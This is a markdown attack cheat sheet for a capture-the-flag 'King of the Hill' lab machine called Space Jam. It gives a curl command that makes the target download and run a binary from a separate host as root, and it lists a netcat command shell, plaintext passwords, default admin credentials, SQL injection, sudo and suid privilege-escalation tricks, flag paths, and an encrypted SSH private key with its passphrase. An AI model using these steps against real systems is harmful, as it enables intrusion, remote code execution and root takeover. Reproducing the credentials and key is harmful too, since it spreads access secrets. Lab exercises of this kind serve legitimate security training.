# Space Jam KOTH machine

## straight to root

- port 3000 hosts a website which takes a cmd querystring param, and runs it as root. each one shot win

  ```
  curl http://10.10.24.24:3000/?cmd=wget+10.10.159.16:1234/client+-O+/.dockerenv+%26%26+chmod+777+/.dockerenv+%26%26+/.dockerenv
  ```

## footholds

- a port which might be random, might be fixed at `61432`, can be connected to via `nc` and will execute commands as jordan
- bunny's password is `carrot123`

## paths to root

- jordan can run `/usr/bin/find` as root via sudo. 
- the postgres user can run `pg` via sudo. this can get to root via:
  ```
  sudo pg /etc/profile
  !/bin/sh
  ```
- `/bin/cp` has the suid bit set. can be used to create new suid binaries, via `/bin/cp --attributes-only --preserve=all /bin/cp "$LFILE"`

## other

- port 80 hosts a nothing website 
- 80/local/fantasticblog the fantasticblog software. can log in with default admin creds, admin:admin, and its vulnerable to sql injection too on id param. the db is running as root

## Flags

- /root/root.txt
- /home/jordan/user.txt
- /home/bunny/user.txt: same as above

## Jordan SSH Key (key: pass123)

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,DA697FD21BE4BCAD4386BD20D4CA9F61
x8ZQB5RrPbKhGqipEb/r76EbGLsqsCgz8rO60Mt/u6qbPPANO5vtKgqkH4WY1NYW
BW7HEgZhTYLHWJwe8/P2OASp2d0q/GhoOOJUw4bWPThuP3CxTZfizLDVjzn5G6dI
MBjpOLqho3BJcQXF2T9gPDjk/mG/OPcAuBofzyEaVh11xX5ILTKTiQHcFizkveD1
ivPlevQAx58HkZIcOsaK4d07cQKhaOiA7KcJ+J5qlE2UkJgB7C3j+qu38XR2Dtyq
Lyvh/RvsVB72iM8gmyMZHdPcdDEjTYSP38aY5Xm6qnqeZfYZNwezg07ObX/4JJ+B
/N0JgQ4hPmK3t5YbFtw844f23u4AkVvhnEmPyqNqTws3oSeqc40QnNCfXgiQs/XU
+7lCCvm8sD+vveWjqP0MPjVqbvn9+bPXCm7PB/yvNDlbZoBhGrde60p5rZSnYrq2
brbFm44nXgdSu2+3N86gNpAojR71DLfzI4a3fkgTa3DBi35g93Hn5jgxh8RN81Ng
e4/yZzoJokwFGkpo+Obikpys2HRjNmeSWeeuOhskzdQ3VGeJFk4zipDOEVD9D7Sn
wAvLh9uqhxw7OpdTLaM3u5KCoN/vGZ3eVJsR/7Bvkw88/IP9v/TtRvlVaGQbpy9q
r8PJNu9UIt6eeq9E96a7QmouGahc3FX8c1IxEynP7gGEYAeqpuTZdub7iQClA5W9
Vaj1jcDbeIj9qBHSwzcIVNiSMgo8sLyruWtdYnRLfwXqVyxgl+uNwho//Zr5Wrfj
w5Ah7jR+9HIwyDajwiD062nXz7rz2Df/ZVchBMNmX9a0EXYfHC3yqAo6kKtC04dF
bplIvd2HPOh3icK5DjbNQJrj9U69pxt1BxtJeMS1kAOb1BOCqsUF5Pvp863ABd2f
0OExqCo1ZYFQajUHqwAyAt2fUn3t91PUiQpc82zoI5hIahUyI8FHNzO5qTEsxlxt
NwWOufbCDaqSowsd/YyaKFpYs87SQeyQi30Qj5EMrChuMoY1a51dKmH+f6tQnfUw
Sw0WMV3kU27MGwyZa062Gphx8iDPCv4RsmUyE9IzJy0uRzxN1l5qLct1ShhTspt0
bfrr/zUJsiU6b9GZp2ExBVALhK5Dij3UeZQ+g8WEKJ/b6lbLfN+KVGGBa5YxFq0M
tuNDJmurhv6tg0gEk03yLTl08N/3wG9N4SkBEZisCP1M3xAJkUpOUX/Ip9MK0hSn
8Qsj6can2vOg3nBM0OlXW9PEwvrhQ5mcTBYtly74naL65NcpfzmKYa4EuiZBbgqr
ZToKCgAjr5PIwxR3qDDnmgF339WGWYwSi+f/mXPPZv92hs2cjlI1lBEC+57OCyN9
OvGwf1FNvyZo9S3fp9dnZng1I2pl5ykj8YwPhsNvAAmpqRV7ABjSUzDEzoJOovP4
kCrPEerOwcQlflWs0Q0HlZ3lb9eyjY1jLvY83l4WJOQdakm/NOtqMv4qtKtDG5pR
uT7lOmWTY+/UOM4oyyWkA4/Eo1hBdFieC8MDP1LZ/dwP5dNwJdf4dz4tPmsJ9T3x
ocT9XUxMJ5sBb41E4pvBWtKce7NrsJlbcgPKQHLWqfIzaM+zuuk0WtJxZeXnqJCG
-----END RSA PRIVATE KEY-----
```
